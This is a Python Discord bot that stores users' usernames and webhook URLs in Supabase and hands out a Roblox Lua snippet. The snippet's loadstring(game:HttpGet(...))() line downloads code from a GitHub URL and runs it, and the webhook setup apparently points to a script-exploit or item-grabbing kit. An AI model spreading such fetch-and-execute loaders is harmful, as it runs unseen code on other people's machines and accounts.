import os
import uuid
import discord
from discord.ext import commands
from supabase import create_client, Client

# Variabile de mediu
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")

# Conectare Supabase
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# Intents și bot
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

# Loadstring default (poți schimba linkul)
DEFAULT_LOADSTRING = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/JadeSCRIPTZ/VisualScripts/refs/heads/main/maaa"))()'


@bot.event
async def on_ready():
    print(f"✅ Bot conectat ca {bot.user}")
    try:
        synced = await bot.tree.sync()
        print(f"Slash commands sincronizate: {len(synced)}")
    except Exception as e:
        print(f"❌ Eroare sync: {e}")


# ──────────────── COMENZI ────────────────

# /setusername
@bot.tree.command(name="setusername", description="Setează un username personalizat pentru scriptul tău.")
async def setusername(interaction: discord.Interaction, username: str):
    user_id = str(interaction.user.id)
    supabase.table("elements").update({"username": username}).eq("user_id", user_id).execute()
    await interaction.response.send_message(f"✅ Username setat: `{username}`", ephemeral=True)


# /setwebhook
@bot.tree.command(name="setwebhook", description="Setează un webhook pentru scriptul tău.")
async def setwebhook(interaction: discord.Interaction, webhook: str):
    user_id = str(interaction.user.id)
    supabase.table("elements").update({"webhook": webhook}).eq("user_id", user_id).execute()
    await interaction.response.send_message(f"✅ Webhook setat: `{webhook}`", ephemeral=True)


# /generate
@bot.tree.command(name="generate", description="Generează sau recuperează scriptul tău complet.")
async def generate(interaction: discord.Interaction):
    user_id = str(interaction.user.id)

    existing = supabase.table("elements").select("*").eq("user_id", user_id).execute()

    if existing.data:
        element = existing.data[0]
        element_id = element["id"]
        script = element["script_code"]
        username = element.get("username", "❌ not set")
        webhook = element.get("webhook", "❌ not set")
    else:
        element_id = str(uuid.uuid4())
        script = DEFAULT_LOADSTRING
        username = "❌ not set"
        webhook = "❌ not set"

        supabase.table("elements").insert({
            "id": element_id,
            "user_id": user_id,
            "script_code": script,
            "username": username,
            "webhook": webhook
        }).execute()

    msg = (
        f"🔑 **Your Element script**\n"
        f"🌐 webhook: {webhook}\n"
        f"👤 username: {username}\n\n"
        f"```lua\n"
        f'ID="{element_id}";\n'
        f"{script}\n"
        f"```"
    )

    await interaction.response.send_message(msg, ephemeral=True)


# /generate-autojoiner
@bot.tree.command(name="generate-autojoiner", description="Generează scriptul pentru autojoiner.")
async def generate_autojoiner(interaction: discord.Interaction):
    user_id = str(interaction.user.id)

    existing = supabase.table("elements").select("*").eq("user_id", user_id).execute()

    if existing.data:
        element = existing.data[0]
        element_id = element["id"]
    else:
        element_id = str(uuid.uuid4())
        supabase.table("elements").insert({
            "id": element_id,
            "user_id": user_id,
            "script_code": DEFAULT_LOADSTRING,
            "username": "❌ not set",
            "webhook": "❌ not set"
        }).execute()

    msg = (
        f"🤖 **Your Autojoiner script**\n"
        f"```lua\n"
        f'ID="{element_id}";\n'
        f"{DEFAULT_LOADSTRING}\n"
        f"```"
    )

    await interaction.response.send_message(msg, ephemeral=True)


# ─────────────────────────────────────────

bot.run(DISCORD_TOKEN)
